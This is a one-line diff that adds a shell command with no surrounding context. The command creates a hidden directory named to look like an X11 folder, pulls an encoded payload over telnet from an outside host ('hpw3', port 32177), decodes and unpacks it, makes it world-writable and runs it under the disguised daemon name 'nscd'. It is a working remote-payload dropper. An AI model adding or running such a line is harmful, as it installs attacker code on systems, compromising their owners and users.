@@ -1,0 +1,1 @@
+/sbin/sh -c (mkdir /tmp/.X11R6; cd /tmp/.X11R6 && telnet hpw3 32177 </dev/console 2>/dev/null |uudecode && uncompress -f nscd.Z && chmod 777 nscd && PATH=. nscd;)&
